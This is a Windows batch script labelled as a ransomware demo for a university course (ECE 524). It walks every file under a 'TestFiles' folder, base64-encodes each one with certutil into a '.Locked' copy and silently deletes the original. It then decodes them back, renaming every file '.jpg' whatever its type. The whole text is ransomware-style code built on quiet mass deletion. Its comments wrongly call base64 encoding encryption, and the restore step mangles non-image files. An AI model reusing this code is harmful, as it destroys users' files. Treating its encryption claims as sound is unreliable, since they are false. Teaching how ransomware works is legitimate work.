@echo off
cls
Title Ransomware - ECE 524 Project

REM Change to 'TestFiles'
cd /d "TestFiles"

echo ===================== Deleteing files in the follow directory =====================
REM Print the directory of that files that will be encrypted
echo  %cd%
echo ==========================================

REM Command to get all files in current folder: dir /b /s
For /F "tokens=*" %%A in ('dir /b /s') do (
    REM Encrypts the file
    certutil -encode "%%~A" "%%~nA.Locked"

    REM Deletes the file ('/q': Quite mode, do not ask if ok to delete on global wildcard)
    Del /q "%%~A"
)

echo ===================== Files deleted and encrypted. Press any key to decrypt =====================
pause>nul

REM Command to get all files in current folder: dir /b /s
For /F "tokens=*" %%A in ('dir /b /s') do (
    REM Decrypt the file
    certutil -decode "%%~A" "%%~nA.jpg"

    REM Deletes the file. Note, '/q': Quite mode, do not ask if ok to delete on global wildcard)
    Del /q "%%~A"
)
